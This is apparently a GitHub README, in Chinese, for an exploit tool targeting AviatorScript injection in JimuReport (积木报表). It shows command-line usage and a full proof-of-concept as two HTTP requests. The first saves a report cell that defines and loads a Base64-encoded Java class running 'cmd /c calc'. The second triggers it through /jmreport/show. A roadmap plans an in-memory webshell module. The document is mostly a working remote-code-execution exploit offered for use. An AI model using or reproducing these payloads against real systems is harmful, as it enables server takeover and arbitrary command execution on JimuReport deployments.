# jumuASexp
积木报表AviatorScript注入利用工具

# V1.1
快速生成payload

# usage
```
java -jar jimuASexp.jar -n classname -c "cmd /c calc"
-n是自己指定的类名
-c 执行的命令
```
![6eab5d4e0e6422ac32667babc578702](https://github.com/user-attachments/assets/6834a493-eeec-4abd-b109-16fb3a173cb0)


# tips
每次注入需要使用不同的类名，因此允许自己指定

# poc

```
POST /jmreport/save HTTP/1.1
Host: localhost:8085
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
Content-Length: 2376

{"designerObj":{"id":"982136216903729153","name":"11","type":"datainfo"},"name":"sheet1","freeze":"A1","freezeLineColor":"rgb(185, 185, 185)","styles":[],"displayConfig":{},"printConfig":{"paper":"A4","width":210,"height":297,"definition":1,"isBackend":false,"marginX":10,"marginY":10,"layout":"portrait","printCallBackUrl":""},"merges":[],"rows":{"0":{"cells":{"0":{"text":" =(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('eval1', Base64Utils.decodeFromString('yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEACmV2YWwxLmphdmEMAAoACwcAIwwAJAAlAQALY21kIC9jIGNhbGMMACYAJwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgAoAQAFZXZhbDEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAhAAEAAQAAAAUqtwABsQAAAAEADQAAAAoAAgAAAAoABAALAAEADgAPAAIADAAAABkAAAADAAAAAbEAAAABAA0AAAAGAAEAAAAOABAAAAAEAAEAEQABAA4AEgACAAwAAAAZAAAABAAAAAGxAAAAAQANAAAABgABAAAAEQAQAAAABAABABEACAATAAsAAQAMAAAAVAADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAIADQAAABYABQAAABUACQAYAAwAFgANABcAFgAZABQAAAAHAAJMBwAVCQABABYAAAACABc='), ClassLoader.getSystemClassLoader());)"}}},"len":100},"cols":{"len":50},"validations":[],"autofilter":{},"dbexps":[],"dicts":[],"loopBlockList":[],"zonedEditionList":[],"fixedPrintHeadRows":[],"fixedPrintTailRows":[],"rpbar":{"show":true,"pageSize":"","btnList":[]},"hiddenCells":[],"hidden":{"rows":[],"cols":[]},"background":false,"area":false,"dataRectWidth":100,"excel_config_id":"982136216903729153","pyGroupEngine":false}
```

```
POST /jmreport/show?previousPage=xxx&jmLink=YWFhfHxiYmI= HTTP/1.1
Host: localhost:8085
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
Content-Length: 29

{"id":"982136216903729153"}

```


#v1.2待开发功能
1.优化显示、增加提示
2.增加内存码编码模块


# v1.1待开发功能
1.验证工具可用性
2.增加命令执行模块
3.尝试忽略mac下产生的报错

